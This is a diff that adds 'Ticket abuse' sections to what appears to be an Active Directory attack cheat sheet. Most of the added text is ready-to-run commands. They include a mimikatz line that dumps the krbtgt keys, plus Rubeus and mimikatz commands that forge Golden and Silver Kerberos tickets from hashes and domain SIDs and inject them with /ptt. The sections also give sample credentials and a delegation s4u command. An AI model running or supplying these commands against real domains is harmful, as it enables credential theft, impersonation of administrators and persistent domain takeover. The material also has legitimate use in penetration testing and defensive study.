@@ -351,3 +351,40 @@ Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofother
 
 ./rubeus.exe s4u /user:fake01$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
+
+# Ticket abuse
+## Golden ticket
+- This attack assumes a Domain Controller compromise where KRBTGT account hash will be extracted which is a requirement for a successful Golden Ticket attack.
+- A Golden Ticket attack consist on the creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user through the use of the NTLM hash of the Active Directory (AD) `krbtgt` account.
+
+### Attack
+```shell
+# get krbtgt keys
+./mimikatz "lsadump::lsa /inject /name:krbtgt"
+
+# Rubeus
+## get info about user
+Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /printcmd
+## use the info to forge a ticket
+Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1 /logoncount:16 /displayname:"Harm J0y" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED
+
+# mimikatz
+./mimikatz  "kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt"
+
+```
+
+## Silver ticket
+This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges.
+
+```shell
+# Rubeus
+## Forge TGS | creduser and credpassword are user have access to ldap info used to query info to forge TGS
+Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\Administrator /credpassword:Password1 /user:ccob  /domain:rubeus.ghostpack.local /ptt
+
+## krbkey and krbenctype arguments are optional  
+Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\Administrator /credpassword:Password1 /user:ccob /krbkey:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /krbenctype:aes256 /domain:rubeus.ghostpack.local /ptt
+
+# mimikatz
+## Forge TGS
+./mimikatz "kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:admin" 
+```
